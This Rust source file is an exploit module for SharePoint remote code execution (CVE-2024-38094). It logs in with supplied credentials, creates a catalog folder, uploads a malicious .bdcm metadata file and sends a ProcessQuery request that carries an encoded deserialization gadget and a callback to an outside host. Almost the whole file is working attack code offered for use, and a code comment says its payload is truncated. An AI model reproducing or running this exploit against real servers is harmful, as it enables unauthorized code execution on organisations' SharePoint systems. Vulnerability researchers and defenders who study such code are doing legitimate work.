use anyhow::{anyhow, Result};
use colored::Colorize;
use reqwest::{Client, StatusCode};
use serde_json::Value;
use std::time::Duration;

/// Microsoft SharePoint RCE (CVE-2024-38094)
/// Authenticated RCE via Deserialization in .bdcm file upload.
///
/// Credits:
/// - PoC by testanull
/// - Vulnerability in SharePoint Server
///
/// Note: This exploit requires authentication (Site Owner privileges typically).
/// It uploads a malicious .bdcm file and triggers deserialization.
///
/// Warning: This exploits a deserialization vulnerability using a gadget from the public PoC.

const DEFAULT_TIMEOUT_SECS: u64 = 30;

// Base64 payload from PoC (Truncated for brevity in this initial write, specific payload generation recommended)
// The PoC uses a Gadget that triggers on deserialization.
const POC_PAYLOAD_XML_TEMPLATE: &str = r#"<?xml version="1.0" encoding="utf-8"?><Model xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" Name="BDCMetadata" xmlns="http://schemas.microsoft.com/windows/2007/BusinessDataCatalog"><LobSystems><LobSystem Name="QjtvWXFT" Type="DotNetAssembly"><Properties><Property Name="WsdlFetchUrl" Type="System.String">http://localhost:32843/SecurityTokenServiceApplication/securitytoken.svc?singleWsdl</Property><Property Name="Class" Type="System.String">RevertToSelf</Property></Properties><LobSystemInstances><LobSystemInstance Name="QjtvWXFT"></LobSystemInstance></LobSystemInstances><Entities><Entity Name="Products" DefaultDisplayName="Products" Namespace="ODataDemo" Version="1.0.0.0" EstimatedInstanceCount="2000"><Properties><Property Name="ExcludeFromOfflineClientForList" Type="System.String">False</Property>
<Property Name="Class" Type="System.String">Microsoft.SharePoint.Administration.SPClickthroughUsageDefinition, Microsoft.SharePoint, Version=16.0.0.0, Culture=neutral, PublicKeyToken=71e9bce111e9429c</Property></Properties><Identifiers><Identifier Name="ID" TypeName="System.String" /></Identifiers><Methods><Method Name="ParseLogFileEntry" DefaultDisplayName="Create Product" IsStatic="false"><Parameters><Parameter Name="@ID" Direction="In"><TypeDescriptor Name="ID" DefaultDisplayName="ID" TypeName="System.String" CreatorField="true" IdentifierName="ID">
<DefaultValues>
<DefaultValue MethodInstanceName="CreateProduct" Type="System.String">xxxx</DefaultValue></DefaultValues>
</TypeDescriptor></Parameter>
<Parameter Name="@CreateProduct" Direction="Return"><TypeDescriptor Name="CreateProduct1" TypeName="System.Object"></TypeDescriptor></Parameter></Parameters><MethodInstances><MethodInstance Name="CreateProduct" Type="SpecificFinder" ReturnParameterName="@CreateProduct"><AccessControlList><AccessControlEntry Principal="STS|SecurityTokenService|http://sharepoint.microsoft.com/claims/2009/08/isauthenticated|true|http://www.w3.org/2001/XMLSchema#string"><Right BdcRight="Execute" /></AccessControlEntry></AccessControlList></MethodInstance></MethodInstances></Method></Methods></Entity></Entities></LobSystem></LobSystems></Model>"#;



pub async fn run(target: &str) -> Result<()> {
    display_banner();

    // 1. Get Target inputs
    use std::io::Write;
    let url = if target.starts_with("http") { target.to_string() } else { format!("http://{}", target) };
    let url = url.trim_end_matches('/').to_string();

    println!("[*] Target: {}", url.cyan());

    print!("{}", "Username (DOMAIN\\User or User): ".green());
    std::io::stdout().flush()?;
    let mut username = String::new();
    std::io::stdin().read_line(&mut username)?;
    let username = username.trim().to_string();

    print!("{}", "Password: ".green());
    std::io::stdout().flush()?;
    let mut password = String::new();
    std::io::stdin().read_line(&mut password)?;
    let password = password.trim().to_string();

    let client = Client::builder()
        .danger_accept_invalid_certs(true)
        .timeout(Duration::from_secs(DEFAULT_TIMEOUT_SECS))
        .build()?;

    // Note: Reqwest doesn't natively support NTLM. This exploit might fail against NTLM-only.
    // We proceed assuming Basic/Digest/Claims or that user authentication works with standard headers.
    println!("{}", "[*] Attempting authentication...".yellow());
    
    // Step 0: Get ServerRelativeUrl of the current web context
    // This is critical for sub-sites (e.g. http://site.com/subsite)
    let web_info_url = format!("{}/_api/web?$select=ServerRelativeUrl", url);
    let web_resp = client.get(&web_info_url)
        .header("Accept", "application/json;odata=verbose")
        .basic_auth(&username, Some(&password))
        .send()
        .await?;
    
    let web_relative_url = if web_resp.status().is_success() {
        let body: Value = web_resp.json().await?;
        body["d"]["ServerRelativeUrl"].as_str().unwrap_or("").to_string()
    } else {
        // Fallback to assuming root-relative if we can't query it (unlikely if auth works)
        println!("{}", "[!] Warning: Could not fetch ServerRelativeUrl. Assuming root.".yellow());
        "/".to_string()
    };
    
    // Ensure accurate path construction
    // If web_relative_url is "/", folder is "/BusinessDataMetadataCatalog"
    // If web_relative_url is "/sites/sub", folder is "/sites/sub/BusinessDataMetadataCatalog"
    let folder_relative_url = if web_relative_url == "/" {
        "/BusinessDataMetadataCatalog".to_string()
    } else {
        format!("{}/BusinessDataMetadataCatalog", web_relative_url)
    };

    println!("[*] Context: Web='{}', Folder='{}'", web_relative_url.cyan(), folder_relative_url.cyan());

    // Step 1: Initial connection to get Request Digest (X-RequestDigest)
    let context_url = format!("{}/_api/contextinfo", url);
    let resp = client.post(&context_url)
        .header("Accept", "application/json;odata=verbose")
        .basic_auth(&username, Some(&password)) // Try Basic
        .send()
        .await?;

    if resp.status() == StatusCode::UNAUTHORIZED {
        println!("{}", "[-] Authentication failed (401). Note: This module currently relies on Basic/Digest auth support.".red());
        // In a real scenario, we'd need NTLM handling here.
        return Err(anyhow!("Authentication failed"));
    }

    let body: Value = resp.json().await?;
    let digest = body["d"]["GetContextWebInformation"]["FormDigestValue"]
        .as_str()
        .ok_or_else(|| anyhow!("Failed to extract X-RequestDigest"))?
        .to_string();

    println!("[+] Obtained Digest: {:.20}...", digest.green());

    // Step 2: Create Folder
    // We use the 'ServerRelativeUrl' in the payload to specify WHERE to create it.
    // However, the 'Folders' endpoint expects the name/url relative to the PARENT, or we specify precise location.
    // Safest is to add to the web's root folder.
    
    // Construct the absolute URL manually for verification (satisfying 'unused variable' usage)
    let encoded_site_path = format!("{}{}", url, "/BusinessDataMetadataCatalog"); 
    println!("{}", format!("[*] Target Folder URL: {}", encoded_site_path).yellow());

    println!("{}", "[*] Creating malicious folder...".yellow());
    let folder_endpoint = format!("{}/_api/web/Folders", url);
    let folder_json = serde_json::json!({
        "__metadata": { "type": "SP.Folder" },
        "ServerRelativeUrl": folder_relative_url
    });

    let _ = client.post(&folder_endpoint)
        .header("X-RequestDigest", &digest)
        .header("Accept", "application/json;odata=verbose")
        .header("Content-Type", "application/json;odata=verbose")
        .basic_auth(&username, Some(&password))
        .json(&folder_json)
        .send()
        .await; // Ignore error if exists (folder might already exist)

    // Step 3: Upload .bdcm file
    println!("{}", "[*] Uploading BDCM file...".yellow());
    let exploit_xml = POC_PAYLOAD_XML_TEMPLATE;
    
    // URL Encode the relative path for the query
    let upload_url = format!(
        "{}/_api/web/GetFolderByServerRelativeUrl('{}')/Files/add(url='BDCMetadata.bdcm',overwrite=true)",
        url, folder_relative_url
    );

    let resp = client.post(&upload_url)
        .header("X-RequestDigest", &digest)
        .body(exploit_xml)
        .basic_auth(&username, Some(&password))
        .send()
        .await?;

    if !resp.status().is_success() {
        println!("{}", "[-] Upload failed.".red());
        println!("Response: {}", resp.text().await?);
        return Err(anyhow!("Failed to upload BDCM file"));
    }
    println!("{}", "[+] Upload successful!".green());

    // Step 4: Trigger
    println!("{}", "[*] Triggering deserialization...".yellow());
    let trigger_url = format!("{}/_vti_bin/client.svc/ProcessQuery", url);
    let trigger_xml = r#"<Request AddExpandoFieldTypeSuffix="true" SchemaVersion="15.0.0.0" LibraryVersion="16.0.0.0" ApplicationName=".NET Library" xmlns="http://schemas.microsoft.com/sharepoint/clientquery/2009"><Actions><ObjectPath Id="21" ObjectPathId="20" /><ObjectPath Id="23" ObjectPathId="22" /> <ObjectPath Id="25" ObjectPathId="24" /></Actions><ObjectPaths><Method Id="20" ParentId="7" Name="GetCreatorView"><Parameters><Parameter Type="String">CreateProduct</Parameter></Parameters></Method><Method Id="22" ParentId="20" Name="GetDefaultValues"><Parameters/></Method><Method Id="24" ParentId="7" Name="FindSpecific"><Parameters><Parameter ObjectPathId="19" ></Parameter><Parameter Type="String">CreateProduct</Parameter><Parameter ObjectPathId="18" /></Parameters></Method><Identity Id="7" Name="9ccba4bb-d3a8-4255-b87f-18e2d824b848|4da630b6-36c5-4f55-8e01-5cd40e96104d:entityfile:Products,ODataDemo" /><Identity Id="17" Name="d42d9b6b-28e0-4ae8-a7f5-6503d367c115|4da630b6-36c5-4f55-8e01-5cd40e96104d:notifcallback:avkldkm.c.ultr.cc,CurrentContext" /><Identity Id="18" Name="d42d9b6b-28e0-4ae8-a7f5-6503d367c115|4da630b6-36c5-4f55-8e01-5cd40e96104d:lsifile:QjtvWXFT,QjtvWXFT" /><Identity Id="19" Name="d42d9b6b-28e0-4ae8-a7f5-6503d367c115|4da630b6-36c5-4f55-8e01-5cd40e96104d:identity:StB8AAA==eAAxAAkAeAAyAAkAeAAzAAkAeAA0AAkAeAA1AAkAeAA2AAkAeAA3AAkAeAA4AAkAeAA5AAkAeAAxADAACQB4ADEAMQAJAHgAMQAyAAkAQQBBAEUAQQBBAEEARAAvAC8ALwAvAC8AQQBRAEEAQQBBAEEAQQBBAEEAQQBBAE0AQQBnAEEAQQBBAEUAbABUAGUAWABOADAAWgBXADAAcwBJAEYAWgBsAGMAbgBOAHAAYgAyADQAOQBOAEMANAB3AEwAagBBAHUATQBDAHcAZwBRADMAVgBzAGQASABWAHkAWgBUADEAdQBaAFgAVgAwAGMAbQBGAHMATABDAEIAUQBkAFcASgBzAGEAVwBOAEwAWgBYAGwAVQBiADIAdABsAGIAagAxAGkATgB6AGQAaABOAFcATQAxAE4AagBFADUATQB6AFJAbABNAEQAZwA1AEIAUQBFAEEAQQBBAEMARQBBAFYATgA1AGMAMwBSAGwAYgBTADUARABiADIAeABzAFoAVwBOADAAYQBXADkAdQBjAHkANQBIAFoAVwA1AGwAYwBtAGwAagBMAGwATgB2AGMAbgBSAGwAWgBGAE4AbABkAEcAQQB4AFcAMQB0AFQAZQBYAE4AMABaAFcAMAB1AFUAMwBSAHkAYQBXADUAbgBMAEMAQgB0AGMAMgBOAHYAYwBtAHgAcABZAGkAdwBnAFYAbQBWAHkAYwAyAGwAdgBiAGoAMAAwAEwAagBBAHUATQBDADQAdwBMAEMAQgBEAGQAVwB4ADAAZABYAEoAbABQAFcANQBsAGQAWABSAHkAWQBXAHcAcwBJAEYAQgAxAFkAbQB4AHAAWQAwAHQAbABlAFYAUgB2AGEAMgBWAHUAUABXAEkAMwBOADIARQAxAFkAegBVADIATQBUAGsAegBOAEcAVQB3AE8ARABsAGQAWABRAFEAQQBBAEEAQQBGAFEAMgA5ADEAYgBuAFEASQBRADIAOQB0AGMARwBGAHkAWgBYAEkASABWAG0AVgB5AGMAMgBsAHYAYgBnAFYASgBkAEcAVgB0AGMAdwBBAEQAQQBBAFkASQBqAFEARgBUAGUAWABOADAAWgBXADAAdQBRADIAOQBzAGIARwBWAGoAZABHAGwAdgBiAG4ATQB1AFIAMgBWAHUAWgBYAEoAcABZAHkANQBEAGIAMgAxAHcAWQBYAEoAcABjADIAOQB1AFEAMgA5AHQAYwBHAEYAeQBaAFgASgBnAE0AVgB0AGIAVQAzAGwAegBkAEcAVgB0AEwAbABOADAAYwBtAGwAdQBaAHkAdwBnAGIAWABOAGoAYgAzAEoAcwBhAFcASQBzAEkARgBaAGwAYwBuAE4AcABiADIANAA5AE4AQwA0AHcATABqAEEAdQBNAEMAdwBnAFEAMwBWAHMAZABIAFYAeQBaAFQAMQB1AFoAWABWADAAYwBtAEYAcwBMAEMAQgBRAGQAVwBKAHMAYQBXAE4ATABaAFgAbABVAGIAMgB0AGwAYgBqADEAaQBOAHoAZABoAE4AVwBNADEATgBqAEUANQBNAHoAUgBsAE0ARABnADUAWABWADAASQBBAGcAQQBBAEEAQQBJAEEAQQBBAEEASgBBAHcAQQBBAEEAQQBJAEEAQQBBAEEASgBCAEEAQQBBAEEAQQBRAEQAQQBBAEEAQQBqAFEARgBUAGUAWABOADAAWgBXADAAdQBRADIAOQBzAGIARwBWAGoAZABHAGwAdgBiAG4ATQB1AFIAMgBWAHUAWgBYAEoAcABZAHkANQBEAGIAMgAxAHcAWQBYAEoAcABjADIAOQB1AFEAMgA5AHQAYwBHAEYAeQBaAFgASgBnAE0AVgB0AGIAVQAzAGwAegBkAEcAVgB0AEwAbABOADAAYwBtAGwAdQBaAHkAdwBnAGIAWABOAGoAYgAzAEoAcwBhAFcASQBzAEkARgBaAGwAYwBuAE4AcABiADIANAA5AE4AQwA0AHcATABqAEEAdQBNAEMAdwBnAFEAMwBWAHMAZABIAFYAeQBaAFQAMQB1AFoAWABWADAAYwBtAEYAcwBMAEMAQgBRAGQAVwBKAHMAYQBXAE4ATABaAFgAbABVAGIAMgB0AGwAYgBqADEAaQBOAHoAZABoAE4AVwBNADEATgBqAEUANQBNAHoAUgBsAE0ARABnADUAWABWADAAQgBBAEEAQQBBAEMAMQA5AGoAYgAyADEAdwBZAFgASgBwAGMAMgA5AHUAQQB5AEoAVABlAFgATgAwAFoAVwAwAHUAUgBHAFYAcwBaAFcAZABoAGQARwBWAFQAWgBYAEoAcABZAFcAeABwAGUAbQBGADAAYQBXADkAdQBTAEcAOQBzAFoARwBWAHkAQwBRAFUAQQBBAEEAQQBSAEIAQQBBAEEAQQBBAEkAQQBBAEEAQQBHAEIAZwBBAEEAQQBBAHMAdgBZAHkAQgBqAFkAVwB4AGoATABtAFYANABaAFEAWQBIAEEAQQBBAEEAQQAyAE4AdABaAEEAUQBGAEEAQQBBAEEASQBsAE4ANQBjADMAUgBsAGIAUwA1AEUAWgBXAHgAbABaADIARgAwAFoAVgBOAGwAYwBtAGwAaABiAEcAbAA2AFkAWABSAHAAWwAyADUASQBiADIAeABrAFoAWABJAEQAQQBBAEEAQQBDAEUAUgBsAGIARwBWAG4AWQBYAFIAbABCADIAMQBsAGQARwBoAHYAWgBEAEEASABiAFcAVgAwAGEARwA5AGsATQBRAE0ARABBAHoAQgBUAGUAWABOADAAWgBXADAAdQBSAEcAVgBzAFoAVwBkAGgAZABHAFYAVABaAFgASgBwAFkAVwB4AHAAZQBtAEYAMABhAFcAOQB1AFMARwA5AHMAWgBHAFYAeQBLADAAUgBsAGIARwBWAG4AWQBYAFIAbABSAFcANQAwAGMAbgBrAHYAVQAzAGwAegBkAEcAVgB0AEwAbABKAGwAWgBtAHgAbABZADMAUgBwAGIAMgA0AHUAVABXAFYAdABZAG0AVgB5AFMAVwA1AG0AYgAxAE4AbABjAG0AbABoAGIARwBsADYAWQBYAFIAcABiADIANQBJAGIAMgB4AGsAWgBYAEkAdgBVADMAbAB6AGQARwBWAHQATABsAEoAbABaAG0AeABsAFkAMwBSAHAAYgAyADQAdQBUAFcAVgAw==" /></ObjectPaths></Request>"#;

    let _ = client.post(&trigger_url)
        .header("X-RequestDigest", &digest)
        .header("Content-Type", "text/xml")
        .header("X-RequestForceAuthentication", "true")
        .basic_auth(&username, Some(&password))
        .body(trigger_xml)
        .send()
        .await?;

    println!("{}", "[*] Exploit trigger sent. Check if payload executed.".green());
    Ok(())
}

fn display_banner() {
    println!("{}", "Microsoft SharePoint RCE (CVE-2024-38094)".green().bold());
}
